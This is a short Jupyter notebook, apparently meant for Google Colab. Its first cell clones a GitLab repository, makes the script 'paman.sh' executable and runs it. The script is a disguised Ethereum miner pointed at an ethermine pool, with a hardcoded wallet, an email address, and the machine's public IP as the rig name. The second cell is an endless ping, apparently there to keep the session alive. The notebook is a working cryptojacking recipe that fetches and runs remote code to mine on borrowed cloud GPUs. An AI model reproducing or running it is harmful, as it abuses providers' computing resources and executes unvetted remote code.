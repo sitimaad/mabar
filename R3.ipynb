{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "R3.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "vB02PsMy1B4CH"
      },
      "source": [
        "!nvidia-smi && git clone https://gitlab.com/hambalihartati/loop.git && cd loop && chmod +x paman.sh && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./paman.sh -algo ethash -pool1 eu1.ethermine.org:14444 -wallet 0x05a10aaa1e862c786a2beada3ca072f5cd38e02f -coin eth -rigName $ip -email sarjon350@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "eRK6VCaO5RtR"
      },
      "source": [
        "!ping 8.8.8.8"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}